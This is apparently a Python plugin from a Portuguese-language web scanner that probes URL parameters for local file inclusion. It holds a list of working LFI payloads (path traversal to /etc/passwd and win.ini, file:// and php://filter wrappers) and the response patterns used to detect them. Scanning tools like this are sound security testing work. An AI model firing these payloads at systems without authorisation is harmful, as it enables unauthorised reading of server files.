import json
import logging
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse
from menu import C
from plugins.output import info, error, success, warn

logging.getLogger("httpx").setLevel(logging.WARNING)

LFI_PAYLOADS = [
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../windows/win.ini",
    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

LFI_INDICATORS = [
    "root:x:0:0:",
    "[extensions]",
    "for 16-bit app support",
]

def scan_lfi(client, url: str) -> list[dict]:
    findings = []
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qsl(parsed.query)
        if not params:
            return findings

        # V10.6: Baseline check — fetch original URL to know which indicators already exist
        baseline_indicators = set()
        baseline_has_b64 = False
        try:
            baseline_resp = client.get(url, timeout=10)
            baseline_body = baseline_resp.text.lower()
            for ind in LFI_INDICATORS:
                if ind in baseline_body:
                    baseline_indicators.add(ind)
            if "pd9wa" in baseline_body:
                baseline_has_b64 = True
        except Exception:
            pass

        for key, value in params:
            for payload in LFI_PAYLOADS:
                test_params = []
                for k, v in params:
                    if k == key:
                        test_params.append((k, payload))
                    else:
                        test_params.append((k, v))
                
                test_query = urllib.parse.urlencode(test_params)
                test_url = parsed._replace(query=test_query).geturl()
                
                try:
                    resp = client.get(test_url, timeout=10)
                    body = resp.text.lower()
                    for ind in LFI_INDICATORS:
                        # V10.6: Only flag if indicator was NOT in baseline
                        if ind in body and ind not in baseline_indicators:
                            findings.append({
                                "url": test_url,
                                "type": "LOCAL_FILE_INCLUSION",
                                "risk": "HIGH",
                                "details": f"Possível LFI via {key} (Indicador: {ind})",
                                "payload": payload,
                            })
                            break
                    # V10.6: Only flag base64 if NOT in baseline
                    if "pd9wa" in body and not baseline_has_b64:
                        findings.append({
                            "url": test_url,
                            "type": "LOCAL_FILE_INCLUSION",
                            "risk": "HIGH",
                            "details": f"Possível LFI Filter Bypass (PHP Wrappers) via {key}",
                            "payload": payload,
                        })
                except Exception:
                    pass
    except Exception:
        pass
    return findings

def run(context: dict) -> list[str]:
    target = context.get("target")
    if not target:
        raise ValueError("Target required")
    print(f"\n{C.BOLD}{C.CYAN}▰▰▰ TESTANDO INCLUSÃO DE ARQUIVOS (LFI) ▰▰▰{C.END}\n")
    
    outdir = Path("output") / target / "lfi"
    outdir.mkdir(parents=True, exist_ok=True)
    results_file = outdir / "lfi_results.json"
    
    try:
        import httpx
    except ImportError:
        error("httpx não encontrado")
        return []
    
    all_findings = []
    urls_file = Path("output") / target / "urls" / "patterns" / "lfi_ready.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "urls" / "urls_200.txt"
        if not urls_file.exists():
            warn("Nenhuma URL com parâmetros encontrada para teste de LFI.")
            return [str(results_file)]
    
    urls = list(set([u.strip() for u in urls_file.read_text().splitlines() if u.strip()]))
    info(f"   📊 Testando {len(urls)} URLs para LFI...")

    limits = httpx.Limits(max_keepalive_connections=50, max_connections=100)
    with httpx.Client(verify=False, timeout=15, limits=limits) as client:
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(scan_lfi, client, url): url for url in urls[:100]}
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        all_findings.extend(result)
                        for f in result:
                            info(f"   🚨 {C.RED}LFI Encontrado: {f['url']}{C.END}")
                except Exception:
                    pass
    
    results_file.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False))
    if all_findings:
        success(f"📂 {len(all_findings)} potenciais vulnerabilidades de LFI encontradas!")
    else:
        success("✅ Nenhuma vulnerabilidade LFI detectada.")
    
    return [str(results_file)]
